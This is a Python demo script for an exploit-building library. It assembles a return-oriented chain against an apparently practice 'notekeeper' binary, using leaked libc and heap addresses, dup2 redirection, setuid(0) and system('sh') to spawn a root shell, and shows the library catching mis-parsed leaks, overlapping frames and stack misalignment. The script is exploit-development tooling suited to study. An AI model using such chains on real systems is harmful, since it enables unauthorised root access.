#!/usr/bin/env python3
# Copyright (c) 2026 Zetier
# SPDX-License-Identifier: Apache-2.0
# mypy: disable-error-code="assignment"
# notekeeper-pwn, the bonus reel: what the declarations buy AS THE EXPLOIT GROWS.
# Scene 1: pre-leak, sixteen cells across two regions report what they wait for --
# and the mis-parsed leak (a u64 read of a 7-byte banner) refuses AT BIND, against
# after.py's declared leak hygiene, instead of landing a payload built on garbage.
# Scene 2: growth -- root first. One alloc + two re-links adds a setuid(0) frame;
# every downstream address re-derives, and the hexdump attributes every qword.
# In before.py that edit is "re-add every offset after it. all of them." with
# nothing checking your arithmetic.
# Scene 3: THE COLLISION -- a teammate places the same frame at a hand-guessed 0x80
# ("there's room after the dup2 frames, right?"). Wrong: shell lives there. In
# p64 soup the two beliefs merge silently; the final emit names every stomp.
# Scene 4: THE ALIGNMENT FOLD -- grow enhanced.py's CHECKED chain the same way and
# the insertion flips rsp's parity at the calls below it. By hand that is the
# movaps SIGSEGV you debug on the target; here it is CHK-207, with the mod-16
# arithmetic done by the fold. One aligner hop per flip and the gate is green.
import collections
import sys
import textwrap

import after
import enhanced

import cento


class SetuidFrame(cento.View):  # scene 2/3's tool: setuid(0), same dance as after.Dup2Frame
    next_rbp: cento.u64
    pop_rdi: cento.u64 = after.POP_RDI
    uid: cento.u64 = 0  # -> rdi: root
    setuid: cento.u64 = after.LIBC + 0x0E5970  # setuid()
    hop: cento.u64 = after.LEAVE_RET


class SetuidCall(cento.Gadget, entry=after.LIBC + 0x0E5970, stride=0x8, entry_sp_mod=8):
    """libc_base+0xe5970: setuid()"""

    pc = cento.Restores(cento.Reg.PC, at=0x0, width=cento.u64)
    needs = {"rdi": "uid"}


def build_grown(*, aligned: bool) -> cento.Chain:
    """enhanced.py's chain, grown: setuid(0) between the dup2 frames and the shell.

    aligned=False is the naive growth (paste the new run in); aligned=True adds the
    ret hops that restore rsp % 16 == 8 at each call the insertion knocked askew.
    """
    layout = cento.Layout(endian="little")
    layout.expect_sym("slab_base", align=0x10)
    slab = layout.region("slab", max_size=enhanced.NOTE_SZ)
    run = slab.chain("frames", at=0x10, abi=enhanced.X86_64, arm=False)
    run.enter(enhanced.LeaveRet)
    for newfd in (0, 1):
        run.hop(enhanced.PopRdi, f"oldfd{newfd}")
        run.hop(enhanced.PopRsiR15, f"newfd{newfd}").frame.r15 = 0
        call = run.hop(enhanced.Dup2Call, f"dup2_{newfd}", carry=cento.Carry.Clobbered)
        call.rdi = enhanced.FD
        call.rsi = newfd
        run.hop(enhanced.LeaveRet, f"pivot{newfd}")
    run.hop(enhanced.PopRdi, "uid")
    if aligned:
        run.hop(enhanced.RetAlign, "align_setuid")
    root = run.hop(SetuidCall, "setuid", carry=cento.Carry.Clobbered)
    root.rdi = 0
    run.hop(enhanced.PopRdi, "cmd")
    if aligned:
        run.hop(enhanced.RetAlign, "align_system")
    shell = run.finish(enhanced.SystemCall)
    shell.rdi = slab.alloc(enhanced.BinShString, "sh")
    return run


def slab_map() -> str:
    return "  ".join(f"{p.name}@+0x{p.offset:02x}" for p in after.slab.placements)


def main() -> None:
    layout = after.layout

    print("== scene 1: emit before either leak -- every waiting cell says so ==")
    fixups = layout.emit(cento.Backend.IMAGE, final=False).fixups
    by_sym = collections.Counter(sym for f in fixups for sym in f.missing)
    counts = ", ".join(f"{n} on {sym}" for sym, n in sorted(by_sym.items()))
    print(f"{len(fixups)} cells wait across 2 regions: {counts}")
    for f in fixups:
        if "slab_base" in f.missing:  # the cross-references: heap addresses, none guessed
            print(f"  {f.owner} ({f.region}+{f.offset:#04x} w{f.width}) awaits {', '.join(f.missing)}")
    try:  # the classic mis-parse: a u64 read of the 7-byte banner leak, one byte short
        layout.bind("libc_base", 0x0000007F1FBABC00, source="banner leak, read wrong")
    except cento.PlacementError as e:
        print(f"refused at bind: {e}")
    layout.bind("libc_base", 0x00007F1FBABC0000, source="puts(got.puts) leak")
    layout.bind("slab_base", 0x0000556E2F4C12A0, source="note[2] stale-ptr print")
    print(f"after two binds: {len(layout.emit(cento.Backend.IMAGE, final=False).fixups)} fixups left")
    print(layout.explain("stack.smash.rbp"))

    print("== scene 2: the exploit grows -- root first, then the shell ==")
    print(f"slab before: {slab_map()}")
    setuid = after.slab.alloc(SetuidFrame, "setuid")  # lands past everything, derived
    after.stdout.next_rbp = setuid  # re-link: stdout's frame now hops to setuid...
    setuid.next_rbp = after.shell  # ...which hops to the shell
    print(f"slab after:  {slab_map()}")
    layout.image("slab")  # the gate passes: the grown chain is whole
    print(layout.explain("slab.setuid.next_rbp"))
    print("the whole edit: one alloc, two re-links; every address above derived")
    print("the grown payload, every qword attributed:")
    print(layout.hexdump(skip=True))

    print("== scene 3: THE COLLISION -- the same frame at a hand-guessed offset ==")
    after.slab.at(0x80, SetuidFrame, name="setuid2")  # before.py habits die hard
    try:
        layout.emit(cento.Backend.IMAGE)
    except cento.EmitError as e:
        # the shape is enforced, not narrated: extents overlap (CHK-001) plus one
        # stomp per shared qword that both placements wrote (4x CHK-008)
        msg = str(e)
        assert "CHK-001" in msg and msg.count("CHK-008") == 4, "refusal shape drifted"
        print("refused:")
        print(textwrap.indent(msg, "  "))
    else:
        sys.exit("expected EmitError: the overlap gate did not fire")
    print("two beliefs about where the shell frame lives cannot coexist past the gate")

    print("== scene 4: THE ALIGNMENT FOLD -- grow the checked chain, and rsp parity flips ==")
    naive = build_grown(aligned=False)
    errs, _warns = naive.issues()
    misaligned = [i for i in errs if i.code == "CHK-207"]
    assert misaligned, "the alignment gate did not fire"
    for i in misaligned:
        print(f"  ERROR {i.code} [{', '.join(i.subjects)}]: {i.msg}")
    fixed = build_grown(aligned=True)
    fixed.seal()  # green: aligner hops restore the contract the insertion broke
    print("aligned: " + "  ".join(f"{p.name.split('.')[-1]}@+0x{p.offset:02x}" for p in fixed.region.placements))
    print("by hand this is the SIGSEGV *inside* system; the fold does the mod-16 arithmetic instead")


if __name__ == "__main__":
    main()
